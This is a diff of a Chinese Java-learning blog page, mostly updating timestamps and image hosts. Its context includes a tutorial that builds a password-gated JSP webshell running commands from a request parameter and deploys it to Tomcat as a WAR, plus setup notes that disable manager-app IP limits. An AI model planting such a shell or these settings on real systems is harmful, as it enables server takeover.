@@ -211,10 +211,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-21 18:14:55 / 修改时间：18:48:09" itemprop="dateCreated datePublished" datetime="2022-01-21T18:14:55+08:00">2022-01-21</time>
+              <time title="创建时间：2022-01-21 18:14:55" itemprop="dateCreated datePublished" datetime="2022-01-21T18:14:55+08:00">2022-01-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -399,7 +405,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-28 00:06:35" itemprop="dateModified" datetime="2022-01-28T00:06:35+08:00">2022-01-28</time>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -494,7 +500,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-01 22:34:09" itemprop="dateModified" datetime="2022-03-01T22:34:09+08:00">2022-03-01</time>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
               </span>
 
           
@@ -527,28 +533,28 @@
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    out.print(Runtime.getRuntime().exec(cmd));</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>成功打开记事本</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119153656574.png" alt="image-20220119153656574"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119153656574.png" alt="image-20220119153656574"></p>
 <p>上面的代码存在诸多不足,比如只能显示单行输出等</p>
 <p>接下来开始解决只能显示单行输出的命令的问题</p>
 <p>Runtime.getRuntime().exec(c)返回的是一个Process对象类型的值</p>
 <p>查看Process源代码,发现其返回的是一个iutputStream,正好可以用inputStream接收</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119154927926.png" alt="image-20220119154927926"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119154927926.png" alt="image-20220119154927926"></p>
 <p>解决办法是利用StringBuilder或者StringBuffer中的append方法和JAVA io流,利用inputStream获取字节流到BufferReader转换成字符流,再通过Append方法写入到要输出的字符串中</p>
 <p>关于StringBuilder和StringBuffer,StringBuilder是线程安全的,编辑的时候会上锁,但是这里为了性能,选择线程不安全的StringBuffer更好</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StringBuffer res=<span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Process p=Runtime.getRuntime().exec(cmd);</span><br><span class="line">        InputStream inputStream=p.getInputStream();</span><br><span class="line">        InputStreamReader inputStreamReader=<span class="keyword">new</span> InputStreamReader(inputStream);</span><br><span class="line">        BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">        String len;</span><br><span class="line">        <span class="keyword">while</span>((len=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            res.append(len+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        res.append(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(res.toString());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>改进后可以执行命令并抛出错误信息,但是windows下很多命令无法执行……….</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119160519025.png" alt="image-20220119160519025"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119160519025.png" alt="image-20220119160519025"></p>
 <p>参考了这篇龙龙姐推荐的文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mingforyou/p/3551199.html">https://www.cnblogs.com/mingforyou/p/3551199.html</a></p>
 <p>明白了<label style="background:yellow">windows下面要把cmd中的命令当做参数去运行cmd</label></p>
 <p>比如<code>dir</code>,就写成<code>cmd /C dir</code></p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119163716240.png" alt="image-20220119163716240"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119163716240.png" alt="image-20220119163716240"></p>
 <p>接下来将代码做简单的修改和功能的封装,让其看起来简短美观</p>
 <p>完成!!!!</p>
 <h5 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%!<span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">(String cmd)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            res.append(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;password&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))&amp;&amp;request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>+execute(request.getParameter(<span class="string">&quot;cmd&quot;</span>))+<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;h2&gt;你让我执行什么啊????&lt;/h2&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>windows下测试:</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119170718703.png" alt="image-20220119170718703"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119170718703.png" alt="image-20220119170718703"></p>
 <p>linux下测试:</p>
 <p>首先通过jar命令打包jsp马为war</p>
 <p><code>jar cvf test.war .\horse.jsp .</code></p>
@@ -556,7 +562,7 @@
 <p>上传war</p>
 <p>打开对应路径</p>
 <p>输入对应参数</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119185016439.png" alt="image-20220119185016439"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119185016439.png" alt="image-20220119185016439"></p>
 
       
     </div>
@@ -607,7 +613,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-19 19:17:03" itemprop="dateModified" datetime="2022-01-19T19:17:03+08:00">2022-01-19</time>
+                <time title="修改时间：2022-03-25 17:18:47" itemprop="dateModified" datetime="2022-03-25T17:18:47+08:00">2022-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -646,7 +652,7 @@
       
           <p>查看系统的位数,通过该命令就能查看</p>
 <p><code>getconf LONG_BIT</code></p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119161624050.png" alt="image-20220119161624050"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119161624050.png" alt="image-20220119161624050"></p>
 <h4 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h4><p>下载jdk对应安装包linuxx64.tar.gz的</p>
 <p>通过ssh工具上传到/usr/local下面</p>
 <p>解压</p>
@@ -660,7 +666,7 @@
 <h5 id="通过source命令重新加载profile文件"><a href="#通过source命令重新加载profile文件" class="headerlink" title="通过source命令重新加载profile文件"></a>通过source命令重新加载profile文件</h5><p><code>source /etc/profile</code></p>
 <h5 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h5><p><code>java -version</code></p>
 <p>出现如下显示,表示安装成功</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119173528732.png" alt="image-20220119173528732"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119173528732.png" alt="image-20220119173528732"></p>
 <h4 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h4><p>在usr/local目录下</p>
 <p><code>mkdir myDir</code></p>
 <p>进入myDir,上传tomcat包</p>
@@ -674,19 +680,19 @@
 <p>还要在对应云服务提供商的控制台去修改防火墙策略添加对应端口</p>
 <p>修改./conf/server.xml配置站点</p>
 <p>修改端口</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119175609053.png" alt="image-20220119175609053"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119175609053.png" alt="image-20220119175609053"></p>
 <p>进入tomcat/bin目录下启动tomcat服务</p>
 <p><code>./startup.sh </code></p>
 <p>但是出现了无法访问的情况</p>
 <p>查看端口开放情况</p>
 <p><code>netstat -tlun</code>,3306也是开放的</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119180956606.png" alt="image-20220119180956606"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119180956606.png" alt="image-20220119180956606"></p>
 <p>查看防火墙端口开放情况</p>
 <p><code>/etc/firewalld/zones/public.xml</code></p>
 <p>也是开放的</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119181250440.png" alt="image-20220119181250440"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119181250440.png" alt="image-20220119181250440"></p>
 <p>使用<code>lsof -i:3306</code>,查看3306占用情况,才发现自己忘记了Mysql在3306运行,把端口改成3333就行了,确实蠢驴一个呜呜呜</p>
-<img src="https://gitee.com/blue_satchel/images/raw/master/tomcat_emoji.jpg" alt="tomcat_emoji" style="zoom: 33%;" />
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/tomcat_emoji.jpg" alt="tomcat_emoji" style="zoom: 33%;" />
 
 <h5 id="访问管理页面managerApp"><a href="#访问管理页面managerApp" class="headerlink" title="访问管理页面managerApp"></a>访问管理页面managerApp</h5><p>根据提示,默认情况下管理页面只能允许同一台主机本地访问</p>
 <p>配置conf/tomcat-users.xml</p>
@@ -697,7 +703,7 @@
 <p>若不加Value元素默认不限制ip</p>
 <p>若不加allow默认限制所有ip访问</p>
 <p>这里为了方便,把value注释掉</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119184223964.png" alt="image-20220119184223964"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119184223964.png" alt="image-20220119184223964"></p>
 <p>现在访问管理页面,按照上面role的账号和密码输入就能访问了</p>
 
       
@@ -741,10 +747,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-17 17:06:18 / 修改时间：18:15:51" itemprop="dateCreated datePublished" datetime="2022-01-17T17:06:18+08:00">2022-01-17</time>
+              <time title="创建时间：2022-01-17 17:06:18" itemprop="dateCreated datePublished" datetime="2022-01-17T17:06:18+08:00">2022-01-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -781,7 +793,7 @@
 
       
           <h1 id="项目搭建–javaWeb"><a href="#项目搭建–javaWeb" class="headerlink" title="项目搭建–javaWeb"></a>项目搭建–javaWeb</h1><h4 id="1-配置一个maven-webapp项目"><a href="#1-配置一个maven-webapp项目" class="headerlink" title="1.配置一个maven webapp项目"></a>1.配置一个maven webapp项目</h4><h4 id="2-配置tomcat"><a href="#2-配置tomcat" class="headerlink" title="2.配置tomcat"></a>2.配置tomcat</h4><h4 id="3-测试项目是否能够跑起来"><a href="#3-测试项目是否能够跑起来" class="headerlink" title="3.测试项目是否能够跑起来"></a>3.测试项目是否能够跑起来</h4><h4 id="4-导入项目中可能会遇到的jar包"><a href="#4-导入项目中可能会遇到的jar包" class="headerlink" title="4.导入项目中可能会遇到的jar包"></a>4.导入项目中可能会遇到的jar包</h4><p>servlet,jsp,mysql-connector,standard….,记得maven同步一下</p>
-<h4 id="5-创建项目包结构"><a href="#5-创建项目包结构" class="headerlink" title="5.创建项目包结构"></a>5.创建项目包结构</h4><p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220117181550313.png" alt="image-20220117181550313"></p>
+<h4 id="5-创建项目包结构"><a href="#5-创建项目包结构" class="headerlink" title="5.创建项目包结构"></a>5.创建项目包结构</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117181550313.png" alt="image-20220117181550313"></p>
 <h4 id="6-编写实体类"><a href="#6-编写实体类" class="headerlink" title="6.编写实体类"></a>6.编写实体类</h4><p>ORM映射: 表—类映射</p>
 <h4 id="7-编写基础公共类"><a href="#7-编写基础公共类" class="headerlink" title="7.编写基础公共类"></a>7.编写基础公共类</h4><h5 id="数据库配置文件"><a href="#数据库配置文件" class="headerlink" title="数据库配置文件"></a>数据库配置文件</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/subms?useUnicode&amp;characterEncoding=utf-8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
 
@@ -833,10 +845,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-17 15:13:34 / 修改时间：16:57:17" itemprop="dateCreated datePublished" datetime="2022-01-17T15:13:34+08:00">2022-01-17</time>
+              <time title="创建时间：2022-01-17 15:13:34" itemprop="dateCreated datePublished" datetime="2022-01-17T15:13:34+08:00">2022-01-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -874,15 +892,15 @@
       
           <h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>java database connectivity</p>
 <p>JDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)</p>
-<img src="https://gitee.com/blue_satchel/images/raw/master/image-20220117151840559.png" alt="image-20220117151840559" style="zoom:80%;" />
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117151840559.png" alt="image-20220117151840559" style="zoom:80%;" />
 
 <p>需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220117154728636.png" alt="image-20220117154728636"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117154728636.png" alt="image-20220117154728636"></p>
 <p>在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai</p>
-<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220117155711276.png" alt="image-20220117155711276"></p>
+<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117155711276.png" alt="image-20220117155711276"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testJdbc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置信息</span></span><br><span class="line">        <span class="comment">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class="line">        String url=<span class="string">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class="line">        String username=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//1.加载驱动,(通过反射)</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//2.连接数据库,代表数据表</span></span><br><span class="line">        Connection connection = DriverManager.getConnection(url,username,password);</span><br><span class="line">        <span class="comment">//3.向数据库发送SQL的对象Statement</span></span><br><span class="line">        <span class="comment">//此处可以使用PreparedStatement预编译,防止sql注入</span></span><br><span class="line">        Statement statement= connection.createStatement();</span><br><span class="line">        <span class="comment">//4.编写sql</span></span><br><span class="line">        String sql=(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="comment">//5.执行sql,execute的选择根据要执行的操作而异</span></span><br><span class="line">        <span class="comment">//增删改都使用executeUpdate(sql)</span></span><br><span class="line">        ResultSet resultSet = statement.executeQuery(sql);<span class="comment">//返回一个resultSet</span></span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;id=&quot;</span>+resultSet.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;name=&quot;</span>+resultSet.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;password=&quot;</span>+resultSet.getObject(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;email=&quot;</span>+resultSet.getObject(<span class="string">&quot;email&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;birthday=&quot;</span>+resultSet.getObject(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6.关闭连接,释放资源(先开后关)</span></span><br><span class="line">        resultSet.close();</span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220117155700032.png" alt="image-20220117155700032"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117155700032.png" alt="image-20220117155700032"></p>
 <h5 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h5><p>可以防止sql注入</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String sql=<span class="string">&quot;insert into users(id,name,password,email,birthday) values (?,?,?,?,?)&quot;</span>;</span><br><span class="line">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class="line">        preparedStatement.setInt(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        preparedStatement.setString(<span class="number">2</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">		.........................................</span><br><span class="line">        preparedStatement.executeUpdate(sql);</span><br></pre></td></tr></table></figure>
 
@@ -955,7 +973,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-19 16:30:15" itemprop="dateModified" datetime="2022-01-19T16:30:15+08:00">2022-01-19</time>
+                <time title="修改时间：2022-03-25 17:18:47" itemprop="dateModified" datetime="2022-03-25T17:18:47+08:00">2022-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1043,10 +1061,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-11 13:12:36 / 修改时间：14:08:46" itemprop="dateCreated datePublished" datetime="2022-01-11T13:12:36+08:00">2022-01-11</time>
+              <time title="创建时间：2022-01-11 13:12:36" itemprop="dateCreated datePublished" datetime="2022-01-11T13:12:36+08:00">2022-01-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -1140,7 +1164,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-01 15:47:15" itemprop="dateModified" datetime="2022-03-01T15:47:15+08:00">2022-03-01</time>
+                <time title="修改时间：2022-03-25 17:18:46" itemprop="dateModified" datetime="2022-03-25T17:18:46+08:00">2022-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
